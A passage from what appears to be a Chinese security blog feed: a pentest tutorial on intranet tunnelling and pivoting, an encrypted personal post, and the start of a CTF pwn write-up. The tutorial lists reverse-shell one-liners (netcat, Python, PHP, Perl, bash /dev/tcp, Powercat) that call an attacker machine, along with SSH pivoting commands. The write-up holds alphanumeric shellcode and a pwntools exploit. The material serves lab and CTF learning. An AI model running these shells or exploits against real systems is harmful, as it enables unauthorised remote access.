5555</code></p><p>ï¼ˆå°†æœ¬åœ°çš„4444ç«¯å£æ¥æ”¶çš„æ•°æ®è½¬å‘åˆ°5555ç«¯å£ï¼‰</p><p>ç„¶åè®¿é—®æœ¬æœºçš„5555ç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kaliä¸‹å¯ï¼šrdesktop &quot;127.0.0.1:5555&quot;</span><br><span class="line">winä¸‹ç›´æ¥è¿œç¨‹æ¡Œé¢é“¾æ¥ï¼š127.0.0.1:5555</span><br></pre></td></tr></table></figure><h4 id="2-netcat"><a href="#2-netcat" class="headerlink" title="2.netcat"></a>2.netcat</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -<span class="built_in">help</span></span><br><span class="line">-p æŒ‡å®šç«¯å£</span><br><span class="line">-v æ˜¾ç¤ºç»†èŠ‚</span><br><span class="line">-u ä½¿ç”¨UDPä¼ è¾“åè®®</span><br><span class="line">-l ç›‘å¬æ¨¡å¼</span><br><span class="line">-w è®¾ç½®è¶…æ—¶æ—¶é—´</span><br></pre></td></tr></table></figure><h5 id="è·å¾—shell"><a href="#è·å¾—shell" class="headerlink" title="è·å¾—shell"></a>è·å¾—shell</h5><p><strong>æ­£å‘shell</strong></p><p>æ­£å‘è¿æ¥ä½¿ç”¨é¢‘ç‡è¾ƒå°‘ï¼Œå› ä¸ºè¿™ç§shellå¾ˆå®¹æ˜“è¢«å„ç§è¾¹ç•Œè®¾å¤‡æ‰€æ‹¦æˆª</p><p>é¶æœºä¸­ï¼š<code>nc -lvp 4444 -e /bin/sh</code>ï¼ˆæŠŠ/bin/shå‘é€ç»™è¯·æ±‚æœ¬æœº4444ç«¯å£çš„ä¸­æ–­ï¼‰</p><p>æ”»å‡»æœºä¸Šï¼š<code>nc 192.168.1.2 4444</code></p><p><strong>åå‘shell</strong></p><p>å—å®³åŠä¸»åŠ¨æ¥è¿æ¥æ”»å‡»æœºï¼Œè¿™ç§æ–¹æ³•åœ¨æ¸—é€æµ‹è¯•ä¸­æ›´ä¸ºå¸¸ç”¨ï¼Œå› ä¸ºå®ƒå¯ä»¥çªç ´è®¸å¤šè¾¹ç•Œè®¾å¤‡çš„å°é”</p><p>æ”»å‡»æœºä¸Šï¼š<code>nc -lvp 5555</code></p><p>é¶æœºä¸Šï¼š    <code>nc 192.168.1.4 5555 -e /bin/sh</code></p><p>è¿™æ˜¯åœ¨é¶æœºä¸Šå·²ç»è£…äº†ncæ”»å‡»ï¼Œè‹¥æ²¡è£…çš„è¯ï¼Œå¯ä½¿ç”¨å…¶ä»–æ¥åå¼¹shellï¼š</p><h6 id="1-ç”¨pyhtonåå¼¹shell"><a href="#1-ç”¨pyhtonåå¼¹shell" class="headerlink" title="1.ç”¨pyhtonåå¼¹shell"></a>1.ç”¨pyhtonåå¼¹shell</h6><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;æ”»å‡»æœºIP&quot;,æ”»å‡»æœºç›‘å¬çš„ç«¯å£));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><h6 id="2-phpåå¼¹shell"><a href="#2-phpåå¼¹shell" class="headerlink" title="2.phpåå¼¹shell"></a>2.phpåå¼¹shell</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;æ”»å‡»æœºip&quot;,æ”»å‡»æœºç›‘å¬çš„ç«¯å£);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><h6 id="3-perlåå¼¹shell"><a href="#3-perlåå¼¹shell" class="headerlink" title="3.perlåå¼¹shell"></a>3.perlåå¼¹shell</h6><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;æ”»å‡»æœºip&quot;;$p=æ”»å‡»æœºç›‘å¬ç«¯å£;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><h6 id="4-bashåå¼¹shell"><a href="#4-bashåå¼¹shell" class="headerlink" title="4.bashåå¼¹shell"></a>4.bashåå¼¹shell</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.4(æ”»å‡»æœºip)/6666 0&gt;&amp;1</span><br><span class="line">å°†å—å®³æœºä¸Šçš„è¾“å…¥ä¸è¾“å‡ºä»¥TCPæµçš„å½¢å¼é‡å®šå‘åˆ°æ”»å‡»æœºçš„6666ç«¯å£</span><br></pre></td></tr></table></figure><h4 id="3-Powercat"><a href="#3-Powercat" class="headerlink" title="3.Powercat"></a>3.Powercat</h4><blockquote><p>  downloadï¼š<a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p></blockquote><p>å·¥å…·ä¸‹è½½åéœ€è¦å¯¼å…¥powercat.ps1è„šæœ¬åæ‰å¯ä»¥æ­£å¸¸ä½¿ç”¨powercat</p><p>æ‰§è¡Œ</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\powercat.ps1</span><br></pre></td></tr></table></figure><p>å¦‚æœæƒé™ä¸å¤Ÿéœ€è¦ä¿®æ”¹æƒé™ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> RemoteSigned</span><br></pre></td></tr></table></figure><p>éƒ¨åˆ†å‚æ•°ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-c æŒ‡å®šä¸€ä¸ªipåœ°å€</span><br><span class="line">-p æŒ‡å®šä¸€ä¸ªç«¯å£</span><br><span class="line">-v æ˜¾ç¤ºè¯¦æƒ…</span><br><span class="line">-l ç›‘å¬æ¨¡å¼</span><br><span class="line">-e ç¨‹åºé‡å®šå‘</span><br></pre></td></tr></table></figure><h3 id="æ­£å‘é“¾æ¥"><a href="#æ­£å‘é“¾æ¥" class="headerlink" title="æ­£å‘é“¾æ¥"></a>æ­£å‘é“¾æ¥</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">8888</span> <span class="literal">-e</span> cmd.exe <span class="literal">-v</span></span><br><span class="line"><span class="comment">#è¿™æ¡å‘½ä»¤çš„æ„æ€æ˜¯æŠŠcmd.exeæ•°æ®åŒ…å‘é€ç»™è¯·æ±‚æœ¬æœº8888ç«¯å£çš„ä¸»æœº</span></span><br></pre></td></tr></table></figure><p>æ”»å‡»æœºï¼š</p><p><code>nc 192.168.1.2 8888 -vv</code></p><h3 id="åå‘é“¾æ¥"><a href="#åå‘é“¾æ¥" class="headerlink" title="åå‘é“¾æ¥"></a>åå‘é“¾æ¥</h3><p>æ”»å‡»æœºå…ˆç›‘å¬æœ¬æœº5555ç«¯å£<code>nc -lpvv 5555</code></p><p>é¶æœºï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat <span class="literal">-c</span> <span class="number">192.168</span>.<span class="number">1.4</span> <span class="literal">-p</span> <span class="number">5555</span> <span class="literal">-v</span> <span class="literal">-e</span> cmd.exe</span><br></pre></td></tr></table></figure><h2 id="åº”ç”¨å±‚"><a href="#åº”ç”¨å±‚" class="headerlink" title="åº”ç”¨å±‚"></a>åº”ç”¨å±‚</h2><h3 id="1-ssh"><a href="#1-ssh" class="headerlink" title="1.ssh"></a>1.ssh</h3><p>å¸¸è§å‚æ•°ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-C å‹ç¼©ä¼ è¾“</span><br><span class="line">-f åå°æ‰§è¡ŒSSH</span><br><span class="line">-N å»ºç«‹é™é»˜è¿æ¥</span><br><span class="line">-g å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°ç”¨äºè½¬å‘çš„ç«¯å£</span><br><span class="line">-L æœ¬åœ°ç«¯å£è½¬å‘</span><br><span class="line">-R è¿œç¨‹ç«¯å£è½¬å‘</span><br><span class="line">-D åŠ¨æ€è½¬å‘</span><br><span class="line">-P æŒ‡å®šSSHç«¯å£</span><br></pre></td></tr></table></figure><p>ç½‘ç»œæ‹“æ‰‘ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">æ”»å‡»æœºï¼š192.168.1.4</span><br><span class="line">webæœåŠ¡ï¼š192.168.1.5</span><br><span class="line">æ•°æ®åº“æœåŠ¡å™¨ï¼š192.168.1.2</span><br><span class="line"></span><br><span class="line">å®éªŒç¯å¢ƒï¼šæ”»å‡»æœºæ— æ³•è®¿é—®æ•°æ®åº“æœåŠ¡å™¨ï¼Œå¯ä»¥è®¿é—®webæœåŠ¡å™¨ä¸”å·²è·å¾—webæœåŠ¡å™¨çš„æƒé™ï¼ŒwebæœåŠ¡å™¨å’Œæ•°æ®åº“æœåŠ¡å™¨å¯ä»¥äº’ç›¸è®¿é—®</span><br><span class="line"></span><br><span class="line">å®éªŒç›®æ ‡ï¼šé€šè¿‡æœ¬åœ°ç«¯å£è½¬å‘ï¼Œè®¿é—®æ”»å‡»æœºæœ¬åœ°çš„5555ç«¯å£ä¾¿å¯ä»¥æ‰“å¼€æ•°æ®åº“æœåŠ¡å™¨çš„è¿œç¨‹æ¡Œé¢</span><br></pre></td></tr></table></figure><h4 id="1-æœ¬åœ°è½¬å‘"><a href="#1-æœ¬åœ°è½¬å‘" class="headerlink" title="1.æœ¬åœ°è½¬å‘"></a>1.æœ¬åœ°è½¬å‘</h4><p>åœ¨æ”»å‡»æœºä¸Šï¼š</p><p><code>ssh -CfNg -L 5555:192.168.1.2:3389 root@192.168.1.5</code>(è¿™æ¡å‘½ä»¤çš„æ„æ€å°±æ˜¯æ”»å‡»æœºå»è¿æ¥webæœåŠ¡å™¨ï¼Œè¿ä¸Šä¹‹åç”±webæœåŠ¡å™¨å»è¿æ¥æ•°æ®åº“æœåŠ¡å™¨çš„3389ç«¯å£å¹¶æŠŠæ•°æ®é€šè¿‡SSHé€šé“ä¼ ç»™æ”»å‡»æœº)</p><p>ä¹‹åä¼šè¾“å…¥webæœåŠ¡å™¨çš„å¯†ç ï¼Œç”±äºæ˜¯é™é»˜æ¨¡å¼ï¼Œå¯ä»¥æœ¬åœ°æŸ¥çœ‹5555ç«¯å£æ˜¯å¦è¢«ç›‘å¬æ¥æ£€æŸ¥é€šé“çš„å»ºç«‹æ˜¯å¦æ­£å¸¸</p><p><code>netstat -tulnp | grep &quot;5555&quot;</code></p><p>æ¥ä¸‹æ¥æ”»å‡»æœºè®¿é—®æœ¬æœº5555ç«¯å£å³å¯æ‰“å¼€æ•°æ®åº“çš„è¿œç¨‹æ¡Œé¢ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:5555</span><br></pre></td></tr></table></figure><h4 id="2-è¿œç¨‹è½¬å‘"><a href="#2-è¿œç¨‹è½¬å‘" class="headerlink" title="2.è¿œç¨‹è½¬å‘"></a>2.è¿œç¨‹è½¬å‘</h4><p>åœ¨webæœåŠ¡å™¨ä¸Šï¼š</p><p><code>ssh -CfNg -R 5555:192.168.1.2:3389 root@192.168.1.4</code>ï¼ˆè¿™æ¡å‘½ä»¤çš„æ„æ€æ˜¯æ­¤æ—¶çš„webæœåŠ¡å™¨è™½ç„¶ä¾æ—§æ˜¯è·³æ¿ï¼Œä½†æ˜¯æ— è®ºæ˜¯è¿æ¥æ•°æ®åº“æœåŠ¡å™¨çš„3389è¿˜æ˜¯å»è¿æ¥æ”»å‡»æœºçš„5555éƒ½æ˜¯webæœåŠ¡å™¨ä¸»åŠ¨å‘èµ·ï¼‰</p><p>ä¹‹åè¾“å…¥æ”»å‡»æœºçš„å¯†ç ï¼Œåœ¨æ”»å‡»æœºè®¿é—®æœ¬åœ°çš„5555ç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:5555</span><br></pre></td></tr></table></figure><h4 id="3-åŠ¨æ€è½¬å‘"><a href="#3-åŠ¨æ€è½¬å‘" class="headerlink" title="3.åŠ¨æ€è½¬å‘"></a>3.åŠ¨æ€è½¬å‘</h4><p>åœ¨æ”»å‡»æœºä¸Šï¼š</p><p><code>ssh -CfNg -D 6000 root@192.168.1.5</code>ï¼ˆæ­å»ºäº†ä¸€ä¸ªåŠ¨æ€çš„SOCKSä»£ç†é€šé“ï¼‰</p><p>ä¹‹åè¾“å…¥webæœåŠ¡å™¨çš„å¯†ç ï¼ŒæŸ¥çœ‹æ˜¯å¦é“¾æ¥æˆåŠŸ<code>netstat -tulnp | grep &quot;:6000&quot;</code></p><p>ç„¶ååœ¨æœ¬åœ°æµè§ˆå™¨è®¾ç½®å¥½socksä»£ç†å°±å¯è®¿é—®æ•°æ®æœåŠ¡å™¨ä¸Šå¼€æ”¾çš„webæœåŠ¡</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;éšè—é€šä¿¡éš§é“æŠ€æœ¯&quot;&gt;&lt;a href=&quot;#éšè—é€šä¿¡éš§é“æŠ€æœ¯&quot; class=&quot;headerlink&quot; title=&quot;éšè—é€šä¿¡éš§é“æŠ€æœ¯&quot;&gt;&lt;/a&gt;éšè—é€šä¿¡éš§é“æŠ€æœ¯&lt;/h1&gt;&lt;p&gt;å½“æˆ‘ä»¬è¿›å…¥å†…ç½‘å®Œæˆä¿¡æ¯æ”¶é›†åï¼Œæ¥ä¸‹æ¥å°±è¦åˆ¤æ–­å†…ç½‘çš„è¿é€šæ€§ï¼ˆæµé‡èƒ½å¦</summary>
      
    
    
    
    
    <category term="å†…ç½‘" scheme="http://example.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>2021å¹´ç»ˆæ€»ç»“</title>
    <link href="http://example.com/2022/02/05/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2022/02/05/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</id>
    <published>2022-02-04T16:00:00.000Z</published>
    <updated>2022-02-06T05:03:48.431Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="æŠ±æ­‰, è¿™ä¸ªå¯†ç çœ‹ç€ä¸å¤ªå¯¹, è¯·å†è¯•è¯•." data-whm="æŠ±æ­‰, è¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«æ ¡éªŒ, ä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹.">  <script id="hbeData" type="hbeData" data-hmacdigest="0b8bf37f576d56e41d751f6bfb99582e12aa305a83b552e783d8da9ee3d66bc2">305e8718864ef4d8feb4c216f8ddc50eeb8631f473c6c8adb2e542944eace3265ae88ab1e24db73cb5a18f140bbf62478a9cf5f182adf00f11f9ca093f890d48ab93b48562b4f245617a13f4502c20c59638f18dca507bf149f16c4699ab87ac457fb8042c69c16f74833b3d4a89bc24c7a57659a0a590c3b2653436ff1ad1d33f8182bdaf755648f2b375c9eefd353685f52a87ed048444300ddc1a16891c6a94976ed09269ce3d8d2c167901bbe16e8bda77a66ab17664e9e650494b619af8eda6bce8ebabeae153b8648e8714e72cbfe725abf763909f1a87b91c2fe6fe5521984a1c5bbe433c2f6b82e0f5826264197f5548aed7e443d67893e3a1c7d4af0eb048c820c5037761dbe7dd7ac725158ee416c70ddea840a758826e77904c7e8ab9c33b46157554c243cc93c5148cbf2dc65f5cdff7c821fcc3b333c7ab3637ddc59696506d7a1ba49fae894811d6ae0bce2a5d003a17edc98988ba2818eaf958d35871ed83632717031aeaaeb44c724411d0f6c8e076b247667ef0a06114f3f6ca3f6b9e5182a193f3a0a9ef014e2502de15579518567532e69c6150cb9b97c0c7e7415931566285c77be76590c0f1ba9fa69a7027e3e52cc893af99f79e3a1ae864c91d54ad181ec96acf0fb82bff03e7ecae041a0f01231da51e0ddf12fe8ab95410cf8a568f0874a3fd8c4ac0eed564b42d138d635b190ae64eda1064affa00b6285b141cf04b27bf53fe6419933ea5d3b2831b7fbdb39870ffbf7edb936ac0b058bba105ca21fd553b3065dc0cb46def5c56f26b318d0841ae9044e717ff891518f0d062e2d8791c7a4f6f78a7b90aaa82ba5d17258895aea28a41d83a197ef652ce5971635379cc251fdf2909ec40e63d82e0038a86b2e329313dea9039430406ec74d0cb2f0959f7cb2d8a02a5045367089760403eab6dab798229ab05024cdb2471b56e39e8481d33c90e2dcff288421457e0d034664555871325b3d473d15b037f68bfdaf02643171a4ec018ebaa8936438c279e9cf755507e3583f9ad0a00811155467b86d95f734d2b0977d4b4b73e75f952e1a7f246b925d88622ae0792c3c7ce7be4c088f1fa7ee9313f0f0ac4a04db153886ace5549accd2be58a4369405edf9eb865c314f24356e8b770d17cb7d061f5f3d29eb1518d27bb9d5adec10031bec9e8ffe096ff16283ef2b10b7e540a04c3fe13b2aa1593d053e9ba5150f5dbb5e685efee4bd8e1dfd9ca08e79ec4998ed2767d9295d19b09a66fa768fa77500a8918842b9c10613373fcb21c0ed5963e0b6501066da9cce7adcf40c25af184f08e5900efd8acbe3a31535866644cf8ffab86cc68c8de24e5e37a504cbe43d7e945784e108343dca76daf8e3f58e0a285bbcc17e02816a63f57d27f8323f83031c9a4da55629319d9fc874e1a1ebce94596750e0925e5392e6856d95a711003a70f377760bdbd078560f34eea24c9f3e4aca7b7bb2a5f31c255947a46fc5c91adcdde57b447ceccc56a06c1b95774696e04ee52a71f18d3bd40239ed94c86f9a4ed2b7c6b807c6e855a4596f5f71b25405f180669d55ad3959724bdd09b0a1f4d3b1855675e1a1a49dd43a672acd9534cc8b514947e88b1e61333349a253cf1e176026672bcb5af9515479a2f268db3ab7386e4de224d12fe3852d3cbabc7310005d903f1944f1f837152887d35cf5537639de368b98351a28caf84b9e17aa79852b2dd802401e60d83e171a1a1dfa7511b2955a6c5f4499cd85b3eced4b46c3ea6899115aaf7828b2e588202a5455d43c9458dd495a2470c509b740c9067d6db60d0d9286d80917e8c9c890bfc34e4dffc083bbb05035c79eafe08598ffbe50a840f3d49348c145ee7a53c149e90ea98825daf2ed36b8a3e0ffd6617339bc1666bad71f577b6893772c94d8c7a04d8ea235ed8c423154deeb5112759be1316829f24f0236e87c8bbf50a17fbcf520acb49c1d1edc23e5b09d9841f2c9ca219f2b7ce7edbbc2ff7b99343916b64cfd6f0510ce0533ed875a4ddcbacef55212cdd81b728ee358fac9467813c84a15576721c8ecfb3e12e0f5d0b5e1db36e6bb2df1f1d25e17d69311353cd9c2af0ab9e2d9a4f304a09e6140f72d272307b19607756174db476344bc618e188827ebff568fea3fcf130d404825b86f53b2a5b8bef28dbefa669cbf3ea683b66f928743f7aab021df505929f41815015e92c4695ba403de4260e573df67366ef92cc8cde084fd32e918c1b8fa921d58baa8408c9a95eb1dbd3361f3d7eac21497ec13c589be785e77ae72699e5932c39eb6a4e46b30a746c29175ba12511b6451e7f098d970a4fe37ea2dca2866e31bcc7650ba9b0f783a9daa3144316cf8cf1596925c84536c5d870e004b7ae965173e21cbb53be56f487321b801b87e1fceefdbf85ac97e757b4027c8070f7705646a75664922a31f72abecac30ad5d7469e9dae644e22f7ddfecc47217b388540703e3995a4fb159eda67864ed99989462cc9cd505c91af2f804b2fdd9c940128f810cbc640b35102496befe96c41c27b689b5ad3f098b8f4c73e419c0d10b3af3ce11e2e3114e368686f0870fb463924ee59c47e28cf37c8e263b4cfb43acefaec12f04332d435708a50d2426b1cfdceead4b7b962482bd18587530ab945d81731f2f26b0829993bf200e52d51ef330a5c0c82682cb541a8625cf07d6cd306423692ff5a19e3957ff9cec87cadf3268a763f8d2a2c8af41b06d723ff8d34f30d7f335f1a04f014287aeb58f7b54066454b256bc34a3eb4f7fec3997f86038d3341fd7f37b47a2d6e4ae67e5db35a5949ab8879219b418b345a3f0755ae73438bd2f2fccff8b5c0801d7da2a1b543fe6cc9f8a58e9cd27f534a040cd3a8b6f629bc5673eb40837622af3faa6dc3b2e9b77fc288732f98ff45c9ea731f57e79b0de345c41dc749127a08876936a3fc14b9576351cda9dbc691148611c8fb4393ebb937d4ff4eff90e4c2edf5ee47f567</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">æ‚¨å¥½, è¿™é‡Œéœ€è¦å¯†ç .</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">è¿™é‡Œæœ‰ä¸œè¥¿è¢«åŠ å¯†äº†ï¼Œéœ€è¦è¾“å…¥å¯†ç æŸ¥çœ‹å“¦ã€‚</summary>
    
    
    
    
    <category term="Life" scheme="http://example.com/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>BUU_PWNåˆ·é¢˜_0x50-0x5F</title>
    <link href="http://example.com/2021/12/08/BUU-PWN-0x50-0x5F/"/>
    <id>http://example.com/2021/12/08/BUU-PWN-0x50-0x5F/</id>
    <published>2021-12-07T16:00:00.000Z</published>
    <updated>2021-12-09T09:50:41.625Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="0x50-mrctf2020-shellcode-revengeï¼ˆå¯è§å­—ç¬¦shellcodeï¼‰"><a href="#0x50-mrctf2020-shellcode-revengeï¼ˆå¯è§å­—ç¬¦shellcodeï¼‰" class="headerlink" title="0x50.mrctf2020_shellcode_revengeï¼ˆå¯è§å­—ç¬¦shellcodeï¼‰"></a>0x50.mrctf2020_shellcode_revengeï¼ˆå¯è§å­—ç¬¦shellcodeï¼‰</h1><p>å› ä¸ºcallçš„ç¼˜æ•…ï¼Œæ²¡åŠæ³•f5.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec mrctf2020_shellcode_revenge </span><br><span class="line">[*] <span class="string">&#x27;/home/gwt/Desktop/mrctf2020_shellcode_revenge&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¤§è‡´æµç¨‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Show me your magic!\n&quot;</span>);</span><br><span class="line">buf = read(<span class="number">0x400</span>)</span><br><span class="line"><span class="keyword">if</span>(!(<span class="number">0x60</span>&lt;<span class="built_in">input</span>[i]&lt;<span class="number">0x7A</span> || <span class="number">0x2F</span>&lt;<span class="built_in">input</span>[i]&lt;ox5A)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I Can&#x27;t Read This!&quot;</span>)</span><br><span class="line">buf()</span><br></pre></td></tr></table></figure><p>äºæ˜¯ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/TaQini/alpha3.git</span><br><span class="line"><span class="built_in">cd</span> alpha3</span><br><span class="line">//éœ€è¦å…ˆç”Ÿæˆæ™®é€šçš„shellcode</span><br><span class="line">vim sc.py</span><br></pre></td></tr></table></figure><p>sc.pyä¸­å†™ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span><span class="comment">#è¿™é‡Œç”¨64ä½å¹³å°åšç¤ºä¾‹</span></span><br><span class="line">sc = shellcraft.sh()<span class="comment">#è¿™é‡Œç”¨shellåšç¤ºä¾‹</span></span><br><span class="line"><span class="built_in">print</span> asm(sc)</span><br></pre></td></tr></table></figure><p>ä¹‹åå†™åˆ°shellcodeä¸­ï¼š<code>python sc.py &gt; shellcode</code></p><p>ç„¶åï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/alpha3$ python ALPHA3.py x64 ascii mixedcase rax --input=<span class="string">&quot;../shellcode&quot;</span></span><br><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;mrctf2020_shellcode_revenge&quot;</span>)</span><br><span class="line"><span class="comment"># io = remote(&quot;node4.buuoj.cn&quot;,29596)</span></span><br><span class="line">payload = <span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N&quot;</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x51-hitcontraining-unlinkï¼ˆunlinkï¼‰"><a href="#0x51-hitcontraining-unlinkï¼ˆunlinkï¼‰" class="headerlink" title="0x51.hitcontraining_unlinkï¼ˆunlinkï¼‰"></a>0x51.hitcontraining_unlinkï¼ˆunlinkï¼‰</h1><p>æ²¡å¼€PIE</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec bamboobox </span><br><span class="line">[*] <span class="string">&#x27;/home/gwt/Desktop/bamboobox&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE 